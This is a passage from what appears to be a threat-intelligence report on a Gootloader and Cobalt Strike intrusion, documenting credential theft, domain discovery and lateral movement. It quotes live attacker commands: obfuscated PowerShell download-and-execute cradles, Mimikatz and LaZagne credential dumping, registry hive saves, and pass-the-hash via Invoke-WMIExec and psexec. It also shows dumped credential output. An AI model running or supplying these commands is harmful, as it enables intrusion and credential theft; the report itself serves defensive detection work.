,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x\n```\n\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.\n\n```image\nAlt: Base64 Encoded\nDescription: The image displays a lengthy encoded PowerShell script, likely used for malicious purposes in a cyber attack, illustrating the complexity of the encoding methods employed by the threat actor. The script is presented in a monospaced font, indicating it is code rather than regular text. The encoding seems to involve multiple layers, including Base64 and potentially other obfuscation techniques, and appears to be related to the execution of a WMIExec script for remote queries.\n```\n\nDecoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.\n\n```image\nAlt: WMIExec\nDescription: The image depicts a user interface for a decoding tool, showing an input section containing a Base64 encoded string that has been obfuscated. The output section displays the decoded PowerShell script named 'Invoke-WMIExec', which includes comments and parameters for executing WMI commands on target hosts using NTLMv2 for authentication. The layout suggests this is a practical demonstration of decoding a potentially malicious script related to cyber threats.\nTranscription: |\n  function Invoke-WMIExec\n  {\n  <#\n  .SYNOPSIS\n  Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.\n  \n  Author: Kevin Robertson (@kevin_robertson)\n  License: BSD 3-Clause\n  \n  .PARAMETER Target\n  Hostname or IP address of target.\n  \n  .PARAMETER Username\n  Username to use for authentication.\n  \n  .PARAMETER Domain\n  Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.\n  \n  .PARAMETER Hash\n  NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.\n  \n  .PARAMETER Command\n  Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.\n  #>\n```\n\n## Credential Access\n\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.\n\n```image\nAlt: mi.ps1\nDescription: The image displays a table documenting a file creation event related to a cybersecurity incident. It includes columns for 'Action Type', 'Folder Path', 'File Name', and 'Initiating Process Folder Path'. The 'Action Type' indicates 'FileCreated', the 'Folder Path' shows 'C:\\Users\\<redacted>', the 'File Name' is 'mi.ps1', and the 'Initiating Process Folder Path' is 'C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe'. This data is relevant to tracking the activities of a malicious PowerShell script in the context of credential access.\nTranscription: |\n  Action Type      Folder Path      File Name   Initiating Process Folder Path\n  FileCreated      C:\\Users\\[redacted]   mi.ps1      c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\n```\n\nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.\n\n```image\nAlt: XOR Encoding\nDescription: The image depicts a detailed output related to a PowerShell process creation event. It includes a command line that shows the execution of a PowerShell script with various parameters and encoded elements. The command appears to be part of a malicious activity, possibly related to credential access or exploitation. Key elements include the use of '-nop', '-noninteractive', and '-ep bypass' flags, along with a script block creation and a base64 encoded string that suggests obfuscation techniques typical in cyber threats.\nTranscription: |\n  TaskCategory          CommandLine\n  Process Create        powershell -nop -noni -ep bypass -w h -c \"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name -clike'F*g'}).Name)('PG01MD9wbGxoJjC3KSoVNjg2KDYpi1oqKi9Nz9kPMWWuUpVODxHMWUxIzxtZDAwX1tOVEFyTFVdMjEjOFFlaHdqbDVVd3xtdH04WyJETWt9amtEMYVIrcHk2dXdrdHlHRVxNmhrKSM4UXZud3N9NVVxdXFzelwx10DVbd3VobWx9a1Z5dX04XF1LU0xXSDVLSeXBTY8u'))%{$_-bxor24}|%{[char]$_})-join'')\"\n```\n\nThis CyberChef recipe can be used to decode the inner encoded command.\n\nThe output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.\n\n```\n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\n```\n\nMonitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.\n\n```image\nAlt: Mimikatz\nDescription: The image displays a terminal output related to the Mimikatz tool, specifically its logon passwords command invocation. It reveals detailed authentication information such as the Authentication ID, User Name, Domain, Logon Server, and various Security Identifiers (SIDs). The output also shows encrypted passwords and associated data for different user sessions, which are vital for cybersecurity analysis and understanding credential access methods used by attackers.\nTranscription: |\n  \"CommandInvocation(Out-Default): \"Out-Default\"\n  ParameterBinding(Out-Default): name=\"InputObject\", value=\"\n    .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11\n   .## ^ ##.  \"A La Vie, A L'Amour\"  (oe.eo)\n   ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )\n   ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n   '## v ##'  /*** Vincent LE TOUX             ( vincent.letoux@gmail.com )\n    '#####'       > https://pingcastle.com / https://mysmartlogon.com ***\n  \n  mimikatz(powershell) # sekurlsa::logonpasswords\n  \n  Authentication Id : 0 ; 58533736 (00000000:037d2600)\n  Session           : Interactive from 4\n  User Name         : DWM-4\n  Domain            : Window Manager\n  Logon Server      : (null)\n  Logon Time        : \n  SID               : S-1-5-90-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username : \n           * Domain   : \n           * NTLM     : eb40793              f7177c39\n           * SHA1     : 348211b              5c344070060a76d3\n          tspkg :\n          wdigest :\n           * Username : \n           * Domain   : \n           * Password : (null)\n          kerberos :\n           * Username :                      $\n           * Domain   : .local\n           * Password : &7y`HDCPk_IwQw&^poDZ3aZ,                 -3#Cri2)&s-!&3fi:JT+qg$8^hH6lv4W;\n          ssp :\n          credman :\n          cloudap :\n  \n  Authentication Id : 0 ; 58526506 (00000000:037db02a)\n  Session           : Interactive from 4\n  User Name         : UMFD-4\n  Domain            : Font Driver Host\n  Logon Server      : (null)\n  Logon Time        : 1/31/2022 4:32:26 PM\n  SID               : S-1-5-96-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username :\n```\n\nIn addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all” switch.\n\n```\nls.exe all -oN -output C:\\Users\\REDACTED\n```\n\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.\n\n```image\nAlt: LaZagne\nDescription: The image displays a table with command line entries related to security processes. It includes commands executed via cmd.exe that save registry hives (security, sam, and system) to specific temporary directory locations on a Windows system. Each command line entry is shown along with its parent command line, indicating the context of execution, which is relevant for analyzing cyber threats and understanding credential access activities.\nTranscription: |\n  CommandLine                                                                                 ParentCommandLine\n  cmd.exe /c \"reg.exe save hklm\\security c:\\windows\\temp\\xoeofpxxon\"                          ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\sam c:\\windows\\temp\\nibkqjzy\"                                 ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\system c:\\windows\\temp\\nfwlgripmy\"                           ls.exe all -oN -output C:\\Users\n```\n\nHere’s the commands from another system:\n\n```\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n```\n\n## Discovery\n\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.\n\n```\npowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==\n```\n\n```image\nAlt: SharpHound\nDescription: The image shows a web interface for decoding Base64 encoded text. On the left side, there is an input area labeled 'Input' where the Base64 encoded string is displayed. Below it, there is a section titled 'Output' which shows the decoded result. The output reveals a PowerShell command that uses 'Invoke-BloodHound' to collect Active Directory data from a specified IP address. The interface includes options for adjusting the decoding parameters, such as the encoding type.\nTranscription: |\n  Recipe\n  \n  From Base64\n  Alphabet\n  A-Za-z0-9+/=\n  \n  [ ] Remove non-alphabet chars\n  \n  Decode text\n  Encoding\n  UTF-16LE (1200)\n  \n  Input\n  SQBFAFgAIABoAE4AZQB3AG8AbAAtTwBiAGoAZQBjAHQAIABOAGUAdwBCAHgALgBGAE8AdwBuAGQAbwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA\n  nAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMQAwADoANQAwADQAMgAnACkAIABJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABoAG8AdQBuAGQAI\n  AAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAcgBvAGQAIABBAGwAbAA=\n  \n  Output\n  IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:10040/'); Invoke-BloodHound -CollectionMethod All\n```\n\nThey also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n```\n\nThe threat actors executed this command remotely on a domain controller, before moving laterally to it:\n\n```\npowershell.exe ls C:\\ > C:\\file.txt\n```\n\nWhile having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.\n\nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n\n```\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n```\n\n```image\nAlt: Advanced IP Scanner\nDescription: The image displays a structured log table containing security event data related to the execution of the Advanced IP Scanner tool. It includes columns such as EventCode, TaskCategory, TargetFilename, ParentImage, and CommandLine. The log entries provide details about file creation and process initiation associated with the Advanced IP Scanner executable, indicating how the tool was run and its parent processes. This log is relevant for tracking malicious activity and understanding lateral movement within a network.\nTranscription: |\n  plaintext\n  EventCode  TaskCategory                          TargetFilename                                                         ParentImage                                    CommandLine\n  11         File created                          C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Windows\\explorer.exe                        \"C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n             (rule: FileCreate)\n  \n  1          Process Create                        C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\" /SL5=\"$7025C,19765324,139776,C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n  \n  1          Process Create                        C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner                C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\" /portable \"C:\\Users\\████\\\" /lng en_us\n```\n\n## Lateral Movement\n\n```image\nAlt: Lateral Movement\nDescription: The image presents a flowchart titled 'Lateral Movement' that visually maps out the techniques used for lateral movement in a cybersecurity context. It details methods such as using Cobalt Strike, Remote Desktop Protocol (RDP), Windows Management Instrumentation (WMI), and PSExec. Each method is outlined with specific actions, including copying and executing Cobalt Strike, RDP usage through a Cobalt Strike proxy, executing commands via WMI, and commands executed to enable 'Restricted Admin Mode'. The layout is structured to provide a clear understanding of the relationships and processes involved in lateral movement during cyber intrusions.\nTranscription: |\n  Lateral Movement\n  \n  Cobalt Strike\n    \\\\COMPUTER\\ADMIN$\\2c075ae.exe\n    Cobalt Strike Copied to ADMIN$ and Executed via Service\n  \n  Remote Desktop Protocol\n    Remote Desktop via Cobalt Strike Proxy\n    RDP into Servers through a Cobalt Strike Beacon proxy from the beachhead\n  \n  WMI\n    Execute Commands on Remote Hosts via WMI\n    Commands Executed to Enable Restricted Admin Mode\n  \n  PSExec\n    Execute Commands on Remote Hosts via PSExec\n    Commands Executed to Enable Restricted Admin Mode\n```\n\nAs observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.\n\n```image\nAlt: Windows Services\nDescription: The image is a screenshot of a Windows Event Log, specifically showing details for Event ID 7045, which indicates that a service has been installed in the system. The log includes fields such as LogName, EventCode, ComputerName, Service File Name, Service Type, Start Type, and Service Account. The Service File Name contains a PowerShell command that has been obfuscated, hinting at malicious activity. This log entry is relevant for understanding the deployment of potentially harmful services in a cybersecurity context.\nTranscription: |\n  LogName=System\n  EventCode=7045\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-21-805815327-460989457-326783143-1113\n  SidType=0\n  SourceName=Microsoft-Windows-Service Control Manager\n  Type=Information\n  RecordNumber=1663\n  Keywords=Classic\n  TaskCategory=None\n  OpCode=The operation completed successfully.\n  Message=A service was installed in the system.\n  \n  Service Name:  a17bf34\n  Service File Name:  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADAAtgB1AHcALQBPGAt1AGwAdAAgAEkATwAuAE0AZQBpAGUAaQB1AGYQBtACgB5AFMAwBuAHYAZQB0AG0AOAArBgAGAABgACgAEAwB1ADYANABTAHQAcQBpAG4AZGwA...\n```\n\nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a tabular data representation showing network traffic details related to executable files involved in a cyber intrusion. It includes columns for source IP, source port, destination IP, destination port, number of packets, total data transmitted in bytes, and associated filenames (e.g., 6bb6ca2.exe, a4a375e.exe, 2c075ae.exe). The data appears to provide insights into the communication patterns and file transfers between systems during the lateral movement phase of an attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                   |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ---------------------- |\n  | 10.              | 57943    | 10.              | 445      | 874     | 827,446           | Filename > 6bbc6a2.exe |\n  |                  |          |                  |          |         | 874,666           |                        |\n  | 10.              | 61386    | 10.              | 445      | 892     | 829,032           | Filename > a4a375e.exe |\n  |                  |          |                  |          |         | 877,224           |                        |\n  | 10.              | 61745    | 10.              | 445      | 1,023   | 843,404           | Filename > 2c075ae.exe |\n  |                  |          |                  |          |         | 898,670           |                        |\n```\n\nThese executables were then executed by a remote service visible in the windows event id 7045 logs.\n\n```image\nAlt: Event Logs\nDescription: The image depicts a log entry that details the installation of a Windows service. It includes specific information such as the service name ('6bb6ca2'), service file name ('\\ADMINb6ca2.exe'), service type (user mode service), service start type (demand start), and service account (LocalSystem). This information is pertinent for analyzing potential malicious activity within a network, particularly related to the deployment of malware or unauthorized services.\nTranscription: |\n  \"A service was installed in the system.\n  \n  Service Name: 6bb6ca2\n  Service File Name: \\\\               \\ADMIN$\\6bb6ca2.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.\n\nRestricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n\nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.\n\n```\npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```\n\n```\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"\n```\n\nThe logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.\n\n```image\nAlt: Restricted Admin Mode\nDescription: The image displays a Windows Event Log entry for Event ID 4624, indicating a successful logon event. It contains detailed information such as the Logon Type, Security ID, Account Name, and notable mention of 'Restricted Admin Mode' being set to 'Yes'. This log entry is significant for tracking authentication methods used by threat actors and understanding their techniques, particularly in the context of lateral movement within a network.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=████████\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=31774\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID:        S-1-5-18\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3E7\n  \n  Logon Information:\n      Logon Type:         10\n      Restricted 